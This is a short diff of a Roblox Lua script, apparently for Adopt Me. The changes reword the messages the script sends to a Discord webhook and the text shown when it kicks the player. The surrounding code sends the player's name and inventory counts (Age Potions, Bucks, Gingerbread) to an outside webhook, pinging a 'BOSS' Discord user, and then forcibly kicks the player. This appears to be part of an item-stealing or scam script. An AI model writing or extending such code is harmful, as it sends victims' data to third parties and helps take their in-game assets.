@@ -85,7 +85,7 @@ wait(1)
 
 -- Prepare data for the webhook
 local data = {
-    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. Counter .. " Age Potion + " .. bucksAmount .. " Bucks + " .. formattedGingerAmount .. " Gingerbread"),
+    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has " .. Counter .. " Age Potion + " .. bucksAmount .. " Bucks + " .. formattedGingerAmount .. " Gingerbread"),
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 
@@ -106,4 +106,5 @@ request(payload)
 
 -- Final action: Kick player
 wait(1)
-localPlayer:Kick("🤖 " .. Counter .. " Age Potion + " .. bucksAmount .. " Bucks + " .. formattedGingerAmount .. " Gingerbread")
+
+localPlayer:Kick("🤖 " .. localPlayer.Name .. " has 🎅 [ADOPT ME] 🎅 " .. Counter .. " Age Potion + " .. bucksAmount .. " Bucks + " .. formattedGingerAmount .. " Gingerbread !")
